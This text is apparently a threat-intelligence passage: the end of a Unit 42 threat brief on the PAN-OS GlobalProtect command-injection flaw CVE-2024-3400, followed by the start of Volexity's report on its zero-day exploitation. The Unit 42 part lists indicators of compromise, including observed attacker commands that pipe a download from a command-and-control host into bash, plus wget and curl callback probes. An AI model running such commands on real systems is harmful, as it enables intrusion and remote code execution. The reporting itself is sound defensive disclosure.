The commands above show two examples of the use of the touch command to create an empty file in the web application folder. The client would then attempt to access this file via an HTTP request to determine if exploitation was successful. The third command shows a bit more malicious behavior, which involves copying the running configuration to the web application folder for access.

We have also seen probing attempts that use either wget or curl to access remote servers that an external party would use the outbound HTTP request to determine successful exploitation and command execution:

* wget srgsd1f.842b727ba4.ipv6.1433.eu[.]org
* wget edcjn.57fe6f5d9d.ipv6.1433.eu[.]org
* curl srgsdf.842b727ba4.ipv6.1433.eu[.]org
* wget --no-check-certificate https://45.121.51[.]2/abc.txt

## Conclusion

The [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) will continue to provide up-to-date information on impacts to Palo Alto Networks products and recommended mitigations. We will continue to update this threat brief with information on exploitation.

Again, Palo Alto Networks would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference [Volexity's blog](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400) for their analysis.

Palo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the [Cyber Threat Alliance](https://www.cyberthreatalliance.org/).

Protections and mitigations for the observed exploitation activity are below and will be updated as more become available.

## Palo Alto Networks Product Protections for CVE-2024-3400

Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.

If you think you may have been compromised or have an urgent matter, get in touch with [Palo Alto Networks support](https://support.paloaltonetworks.com/).

### Next-Generation Firewalls and Prisma Access With Advanced Threat Prevention

[Next-Generation Firewall](https://docs.paloaltonetworks.com/ngfw) with the [Advanced Threat Prevention](https://docs.paloaltonetworks.com/advanced-threat-prevention/administration) security subscription can help block exploitation of CVE-2024-3400 via Threat Prevention signatures [95187](https://threatvault.paloaltonetworks.com/?query=95187), [95189](https://threatvault.paloaltonetworks.com/?query=95189) and [95191](https://threatvault.paloaltonetworks.com/?query=95191).

### **Cortex XDR, XSIAM and the Unified Cloud Agent**

[Cortex XDR](https://docs-cortex.paloaltonetworks.com/p/XDR) and [XSIAM](https://docs-cortex.paloaltonetworks.com/p/XSIAM) agents and analytics help protect and detect against post-exploitation activity if an attacker tries to enumerate or laterally move to other assets.

### Cortex Xpanse and XSIAM ASM Module

[Cortex Xpanse](https://docs-cortex.paloaltonetworks.com/p/XPANSE) has the ability to identify exposed Palo Alto Networks GlobalProtect devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the Palo Alto Networks GlobalProtect Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.

## Indicators of Compromise

### UPSTYLE Backdoor

* 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac
* 5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078

### Command and Control Infrastructure

* 172.233.228[.]93
* hxxp://172.233.228[.]93/policy
* hxxp://172.233.228[.]93/patch
* 66.235.168[.]222

### Hosted Python Backdoor

* 144.172.79[.]92
* nhdata.s3-us-west-2.amazonaws[.]com

### Observed Commands

* wget -qO- hxxp://172.233.228[.]93/patch|bash
* wget -qO- hxxp://172.233.228[.]93/policy | bash
* "failed to unmarshal session(.\+.\/" mp-log gpsvc.log\* (Please see our [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) for further information on this command.)

## Additional Resources

* [Understanding the Midnight Eclipse Activity and CVE 2024-3400](https://thecyberwire.com/podcasts/threat-vector/21/notes) – Unit 42 Threat Vector podcast, Episode 21, Palo Alto Networks
* [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK) – Knowledge Base, Palo Alto Networks Customer Support Portal
* [More on the PAN-OS CVE-2024-3400](https://www.paloaltonetworks.com/blog/2024/04/more-on-the-pan-os-cve/) – Palo Alto Networks Blog
* [CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect](https://security.paloaltonetworks.com/CVE-2024-3400) – Palo Alto Networks
* [Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/) – Volexity
* [Palo Alto Networks Releases Guidance for Vulnerability in PAN-OS, CVE-2024-3400](https://www.cisa.gov/news-events/alerts/2024/04/12/palo-alto-networks-releases-guidance-vulnerability-pan-os-cve-2024-3400) – Cybersecurity and Infrastructure Security Agency (CISA)

## Update Log

* Updated April 12, 2024, at 10:15 a.m. PT to add Cortex XDR and XSIAM product protections, as well as Additional Resources.
* Updated April 12, 2024, at 12:45 a.m. PT to add Cortex Xpanse product protections.
* Updated April 14, 2024, at 11:05 a.m. PT to clarify impact on GlobalProtect portal configurations.
* Updated April 14, 2024, at 7:55 p.m. PT to reflect that hotfixes are in place and ETAs added in our Security Advisory for upcoming hotfixes.
* Updated April 15, 2024, at 8:35 a.m. PT to update exploitation activity in Executive Summary.
* Updated April 15, 2024, at 9:16 a.m. PT to update language on Threat ID 95187 in the Executive Summary, including information on firewalls managed by Panorama.
* Updated April 16, 2024, at 7:45 a.m. PT to add Additional Exploitation Observations section with IoCs and commands.
* Updated April 16, 2024, at 9:48 a.m. PT to remove update.py filename from list of indicators.
* Updated April 16, 2024, at 2:00 p.m. PT to update the Executive Summary and Mitigations section to add new mitigation guidance, a new Threat Prevention signature and availability of PAN-OS fixes.
* Updated April 16, 2024, at 2:40 p.m. PT to align the Executive Summary and Details of the Vulnerability sections more closely to the Security Advisory.
* Updated April 17, 2024, at 6:15 a.m. PT to add Threat ID 95191.
* Updated April 17, 2024, at 11:30 a.m. PT to add an additional bullet to the Observed Commands subsection.
* Updated April 17, 2024, at 12:23 p.m. PT to clarify contact information.
* Updated April 19, 2024, at 12:45 p.m. PT to heavily revise the Current Scope of Attack section as well the section on Operation MidnightEclipse activity (UPSTYLE and Cron Job Backdoor Activity).
* Updated April 22, 2024, at 3:15 p.m. PT to more thoroughly define the levels of activity seen in the Current Scope of the Attack section.
* Updated April 23, 2024, at 7:40 a.m. PT to add language to recommendations for Level 2 and Level 3 in Scope of Attack section. Clarified language in Guidance section. Added Update Log section.
* Updated Apr 24, 2024, at 7:10 a.m. PT to include a link to a Customer Support Portal Knowledge Base article.
* Updated April 24, 2024, at 6:15 p.m. PT to include updated XQL queries for hits for known IoCs in NGFW traffic and in XDR telemetry and NGFW telemetry.
* Updated April 25, 2024, at 8:00 a.m. PT to add Knowledge Base article to Additional Resources.
* Updated April 26, 2024, at 12:22 p.m. PT for clarity and consistency.
* Updated April 29, 2024, at 6:52 a.m. to add Unit 42 Threat Vector podcast on the vulnerability to Additional Resources.
* Updated April 29, 2024, at 11:55 a.m. PT to update exploitation status about proof of concept by third parties of post-exploit persistence techniques.
* Updated May 1, 2024, at 8:05 a.m. PT for clarity and consistency.
* Updated May 3, 2024, at 7:25 a.m. PT to note additional mitigation information for customers was added to the Security Advisory.
* Updated May 20, 2024, at 8:10 a.m. PT to adjust second threat hunting query.

Back to top
### Tags

* [Backdoor](https://unit42.paloaltonetworks.com/tag/backdoor/ "backdoor")
* [Command injection](https://unit42.paloaltonetworks.com/tag/command-injection/ "Command injection")
* [CVE-2024-3400](https://unit42.paloaltonetworks.com/tag/cve-2024-3400/ "CVE-2024-3400")
* [MidnightEclipse](https://unit42.paloaltonetworks.com/tag/midnighteclipse/ "MidnightEclipse")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")
* [Upstyle](https://unit42.paloaltonetworks.com/tag/upstyle/ "Upstyle")

[Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
[Next: Muddled Libra’s Evolution to the Cloud](https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/ "Muddled Libra’s Evolution to the Cloud")

### Table of Contents

### Related Articles

* [Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/ "article - table of contents")
* [Silent Skimmer Gets Loud (Again)](https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/ "article - table of contents")
* [Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/ "article - table of contents")

## Related Resources

![A pictorial representation of a jailbreaking technique. Abstract digital tunnel with glowing blue lights and intricate patterns, representing data or technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 31, 2024
[#### Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/)

* [GenAI](https://unit42.paloaltonetworks.com/tag/genai/ "GenAI")
* [Prompt injection](https://unit42.paloaltonetworks.com/tag/prompt-injection/ "prompt injection")
* [Jailbroken](https://unit42.paloaltonetworks.com/tag/jailbroken/ "jailbroken")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/ "Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability")

![Pictorial representation of using LLMs to obfuscate malicious JavaScript detection. A man wearing glasses, looking intently at a screen with reflections visible in the glasses of computer code.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 20, 2024
[#### Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/)

* [Credential stealer](https://unit42.paloaltonetworks.com/tag/credential-stealer/ "credential stealer")
* [Data Augmentation](https://unit42.paloaltonetworks.com/tag/data-augmentation/ "Data Augmentation")
* [FraudGPT](https://unit42.paloaltonetworks.com/tag/fraudgpt/ "FraudGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/ "Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript")

![Pictorial representation of attackers leveraging Active Directory or LDAP. Close-up view of a server rack panel with illuminated lights and a digital display reading 'SYSTEM HACKED'.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 17, 2024
[#### LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/)

* [Stately Taurus](https://unit42.paloaltonetworks.com/tag/stately-taurus/ "Stately Taurus")
* [ALPHV](https://unit42.paloaltonetworks.com/tag/alphv/ "ALPHV")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/ "LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory")

![Pictorial representation of HeartCrypt. A laptop on a desk displaying a vivid graphical interface with cyber security and data analytics themes, illuminated by red ambient lighting.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 13, 2024
[#### Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/)

* [Redline infostealer](https://unit42.paloaltonetworks.com/tag/redline-infostealer/ "Redline infostealer")
* [Lumma Stealer](https://unit42.paloaltonetworks.com/tag/lumma-stealer/ "Lumma Stealer")
* [Remcos](https://unit42.paloaltonetworks.com/tag/remcos/ "Remcos")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/ "Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation")

![Pictorial representation of suspicious registration scam campaigns. Close-up image of a glowing red WiFi connectivity symbol on a textured black surface, symbolizing digital security technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 6, 2024
[#### Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/)

* [Network scanning](https://unit42.paloaltonetworks.com/tag/network-scanning/ "network scanning")
* [Cybersquatting](https://unit42.paloaltonetworks.com/tag/cybersquatting/ "cybersquatting")
* [ChatGPT](https://unit42.paloaltonetworks.com/tag/chatgpt/ "ChatGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/ "Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams")

![Pictorial representation of vulnerabilities such as CVE-2024-0012 and CVE-2024-9474. A panoramic nighttime view of city skyline with illuminated high-rise buildings and vibrant lights.]()

[![ category icon]()High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/) November 22, 2024
[#### Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/)

* [PAN-OS](https://unit42.paloaltonetworks.com/tag/pan-os/ "PAN-OS")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/ "Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)")

![Close-up of a person wearing glasses, reflecting computer code on the lens.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 22, 2024
[#### Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/)

* [Remote Code Execution](https://unit42.paloaltonetworks.com/tag/remote-code-execution/ "Remote Code Execution")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")
* [MacOS](https://unit42.paloaltonetworks.com/tag/macos/ "macOS")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/ "Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples")

![Pictorial representation of FrostyGoop malware. Close-up view of a digital screen displaying a pixelated, abstract image, possibly representing a face.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 19, 2024
[#### FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/)

* [BUSTLEBERM](https://unit42.paloaltonetworks.com/tag/bustleberm/ "BUSTLEBERM")
* [FrostyGoop](https://unit42.paloaltonetworks.com/tag/frostygoop/ "FrostyGoop")
* [Go](https://unit42.paloaltonetworks.com/tag/go/ "Go")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/ "FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications")

![Pictorial representation of a threat like the Bring Your Own Vulnerable Driver (BYOVD) technique. Image of computer code on a screen with a prominent biohazard symbol.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 1, 2024
[#### TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/)

* [Extortion](https://unit42.paloaltonetworks.com/tag/extortion/ "Extortion")
* [Data exfiltration](https://unit42.paloaltonetworks.com/tag/data-exfiltration/ "data exfiltration")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/ "TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit")

![A pictorial representation of jailbreaking a large language model. A glowing cube with the letters "AI" illuminated in blue, surrounded by a network of interconnected circuits and data lines, representing artificial intelligence technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) October 23, 2024
[#### Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction](https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/)

* [Jailbroken](https://unit42.paloaltonetworks.com/tag/jailbroken/ "jailbroken")
* [LLM](https://unit42.paloaltonetworks.com/tag/llm/ "LLM")
* [GenAI](https://unit42.paloaltonetworks.com/tag/genai/ "GenAI")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/ "Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction")

* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)
* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)
![Enlarged Image]()

![Newsletter]()

![UNIT 42 Small Logo]()
Get updates from Unit 42
## Peace of mind comes from staying ahead of threats. Contact us today.

Your Email

Subscribe for email updates to all Unit 42 threat research.
By submitting this form, you agree to our [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use") and acknowledge our [Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy Statement")

Invalid captcha!

Subscribe ![Right Arrow]()
![loader](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg)

### Products and services

* [Network Security Platform](https://www.paloaltonetworks.com/network-security "Network Security Platform")
* [CLOUD DELIVERED SECURITY SERVICES](https://www.paloaltonetworks.com/network-security/security-subscriptions "CLOUD DELIVERED SECURITY SERVICES")
* [Advanced Threat Prevention](https://www.paloaltonetworks.com/network-security/advanced-threat-prevention "Advanced Threat Prevention")
* [DNS Security](https://www.paloaltonetworks.com/network-security/advanced-dns-security "DNS Security")
* [Data Loss Prevention](https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention "Data Loss Prevention")
* [IoT Security](https://www.paloaltonetworks.com/network-security/enterprise-iot-security "IoT Security")

* [Next-Generation Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall "Next-Generation Firewalls")
* [Hardware Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware "Hardware Firewalls")
* [Strata Cloud Manager](https://www.paloaltonetworks.com/network-security/strata-cloud-manager "Strata Cloud Manager")

* [SECURE ACCESS SERVICE EDGE](https://www.paloaltonetworks.com/sase "SECURE ACCESS SERVICE EDGE")
* [Prisma Access](https://www.paloaltonetworks.com/sase/access "Prisma Access")
* [Prisma SD-WAN](https://www.paloaltonetworks.com/sase/sd-wan "Prisma SD-WAN")
* [Autonomous Digital Experience Management](https://www.paloaltonetworks.com/sase/adem "Autonomous Digital Experience Management")
* [Cloud Access Security Broker](https://www.paloaltonetworks.com/sase/next-gen-casb "Cloud Access Security Broker")
* [Zero Trust Network Access](https://www.paloaltonetworks.com/sase/ztna "Zero Trust Network Access")

* [Code to Cloud Platform](https://www.paloaltonetworks.com/prisma/whyprisma "Code to Cloud Platform")
* [Prisma Cloud](https://www.paloaltonetworks.com/prisma/cloud "Prisma Cloud")
* [Cloud-Native Application Protection Platform](https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform "Cloud-Native Application Protection Platform")

* [AI-Driven Security Operations Platform](https://www.paloaltonetworks.com/cortex "AI-Driven Security Operations Platform")
* [Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex XDR")
* [Cortex XSOAR](https://www.paloaltonetworks.com/cortex/cortex-xsoar "Cortex XSOAR")
* [Cortex Xpanse](https://www.paloaltonetworks.com/cortex/cortex-xpanse "Cortex Xpanse")
* [Cortex XSIAM](https://www.paloaltonetworks.com/cortex/cortex-xsiam "Cortex XSIAM")
* [External Attack Surface Protection](https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management "External Attack Surface Protection")
* [Security Automation](https://www.paloaltonetworks.com/cortex/security-operations-automation "Security Automation")
* [Threat Prevention, Detection & Response](https://www.paloaltonetworks.com/cortex/detection-and-response "Threat Prevention, Detection & Response")

* [Threat Intel and Incident Response Services](https://www.paloaltonetworks.com/unit42 "Threat Intel and Incident Response Services")
* [Proactive Assessments](https://www.paloaltonetworks.com/unit42/assess "Proactive Assessments")
* [Incident Response](https://www.paloaltonetworks.com/unit42/respond "Incident Response")
* [Transform Your Security Strategy](https://www.paloaltonetworks.com/unit42/transform "Transform Your Security Strategy")
* [Discover Threat Intelligence](https://www.paloaltonetworks.com/unit42/threat-intelligence-partners "Discover Threat Intelligence")

### Company

* [About Us](https://www.paloaltonetworks.com/about-us "About Us")
* [Careers](https://jobs.paloaltonetworks.com/en/ "Careers")
* [Contact Us](https://www.paloaltonetworks.com/company/contact-sales "Contact Us")
* [Corporate Responsibility](https://www.paloaltonetworks.com/about-us/corporate-responsibility "Corporate Responsibility")
* [Customers](https://www.paloaltonetworks.com/customers "Customers")
* [Investor Relations](https://investors.paloaltonetworks.com/ "Investor Relations")
* [Location](https://www.paloaltonetworks.com/about-us/locations "Location")
* [Newsroom](https://www.paloaltonetworks.com/company/newsroom "Newsroom")

### Popular links

* [Blog](https://www.paloaltonetworks.com/blog/ "Blog")
* [Communities](https://www.paloaltonetworks.com/communities "Communities")
* [Content Library](https://www.paloaltonetworks.com/resources "Content Library")
* [Cyberpedia](https://www.paloaltonetworks.com/cyberpedia "Cyberpedia")
* [Event Center](https://events.paloaltonetworks.com/ "Event Center")
* [Manage Email Preferences](https://start.paloaltonetworks.com/preference-center "Manage Email Preferences")
* [Products A-Z](https://www.paloaltonetworks.com/products/products-a-z "Products A-Z")
* [Product Certifications](https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs "Product Certifications")
* [Report a Vulnerability](https://www.paloaltonetworks.com/security-disclosure "Report a Vulnerability")
* [Sitemap](https://www.paloaltonetworks.com/sitemap "Sitemap")
* [Tech Docs](https://docs.paloaltonetworks.com/ "Tech Docs")
* [Unit 42](https://unit42.paloaltonetworks.com/ "Unit 42")
* [Do Not Sell or Share My Personal Information](https://panwedd.exterro.net/portal/dsar.htm?target=panwedd "Do Not Sell or Share My Personal Information")

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg)](https://www.paloaltonetworks.com/ "Footer Nav")

* [Privacy](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy")
* [Trust Center](https://www.paloaltonetworks.com/legal-notices/trust-center "Trust Center")
* [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use")
* [Documents](https://www.paloaltonetworks.com/legal "Documents")

Copyright © 2025 Palo Alto Networks. All Rights Reserved

* [![YouTube]()](https://www.youtube.com/user/paloaltonetworks "YouTube")
* [![Twitter]()](https://twitter.com/Unit42_Intel "X")
* [![Facebook]()](https://www.facebook.com/PaloAltoNetworks/ "Facebook")
* [![LinkedIn]()](https://www.linkedin.com/company/palo-alto-networks "LinkedIn")
* [![Podcast]()](https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/ "Podcast")

![Globe icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg)
EN
![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* Select your language
* [USA (ENGLISH)](https://unit42.paloaltonetworks.com/cve-2024-3400/)
* [JAPAN (日本語)](https://unit42.paloaltonetworks.jp/cve-2024-3400/)

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)

Your browser does not support the video tag.

### Default Heading

Read the article
![Right Arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg)

Seekbar

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Volume](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg)

Volume

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)



=== Content from www.volexity.com_a8900222_20250111_061218.html ===


* [Request A Demo](https://www.volexity.com/company/contact/demo-request/)

* [Breach Assistance](https://www.volexity.com/company/contact/breach-assistance/)

[![Volexity](https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png)](https://www.volexity.com)

* [Products](https://www.volexity.com/products-overview/)
  + [Products Overview](https://www.volexity.com/products-overview/)
  + [Volcano](https://www.volexity.com/products-overview/volcano/)
  + [Surge](https://www.volexity.com/products-overview/surge/)
* [Services](https://www.volexity.com/services-overview/)
  + [Services Overview](https://www.volexity.com/services-overview/)
  + [Incident Response](https://www.volexity.com/services-overview/incident-response/)
  + [Network Security Monitoring](https://www.volexity.com/services-overview/network-security-monitoring/)
  + [Proactive Threat Assessments](https://www.volexity.com/services-overview/proactive-threat-assessments/)
  + [Threat Intelligence](https://www.volexity.com/services-overview/threat-intelligence/)
  + [M&A Cybersecurity Assessments](https://www.volexity.com/services-overview/mergers-acquisitions-cybersecurity-assessments/)
* [Company](https://www.volexity.com/company/about/)
  + [About](https://www.volexity.com/company/about/)
  + [News & Press](https://www.volexity.com/company/news-press/)
  + [Careers](https://www.volexity.com/company/careers/)
  + [Internships](https://www.volexity.com/company/internships/)
  + [Resources](https://www.volexity.com/company/resources/)
* [Blog](https://www.volexity.com/blog/)
* [Contact](https://www.volexity.com/company/contact/)

blog

## Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)

April 12, 2024

by Volexity Threat Research

Facebook
Twitter
Email

![Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400](https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png)

> *Volexity would like to thank Palo Alto Networks for their partnership, cooperation, and rapid response to this critical issue.* *Their research can be found* [*here*](http://unit42.paloaltonetworks.com/cve-2024-3400).

On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor.

The threat actor, which Volexity tracks under the alias UTA0218, was able to remotely exploit the firewall device, create a reverse shell, and download further tools onto the device. The attacker focused on exporting configuration data from the devices, and then leveraging it as an entry point to move laterally within the victim organizations.

Volexity worked closely with its customer and the Palo Alto Networks Product Security Incident Response Team (PSIRT) to investigate the root cause of the compromise. Through this cooperative investigation, the Palo Alto Networks PSIRT team was able to confirm the vulnerability as an OS command injection issue and assigned it CVE-2024-3400. The issue is an unauthenticated remote code execution vulnerability with a CVSS base score of 10.0. Palo Alto Networks has since [issued an advisory](https://security.paloaltonetworks.com/CVE-2024-3400) for CVE-2024-3400 that includes information regarding a threat protection signature released to customers, as well as a timeline for a fix, which at the time of writing is expected April 14, 2024.

During its investigation, Volexity observed that UTA0218 attempted to install a custom Python backdoor, which Volexity calls UPSTYLE, on the firewall. The UPSTYLE backdoor allows the attacker to execute additional commands on the device via specially crafted network requests. Details on this backdoor are included further on in this report.

As Volexity broadened its investigation, it discovered successful exploitation at multiple other customers and organizations dating back to March 26, 2024. Those attempts appear to be the threat actor testing the vulnerability by placing zero-byte files on firewall devices to validate exploitability. On April 7, 2024, Volexity observed the attacker attempting and failing to deploy a backdoor on a customer’s firewall device. Three days later, on April 10, 2024, UTA0218 was observed exploiting firewall devices to successfully deploy malicious payloads. A second compromise Volexity observed on April 11, 2024, followed a nearly identical playbook. A timeline associated with the discovery and subsequent activities is below.

![](https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2.png)

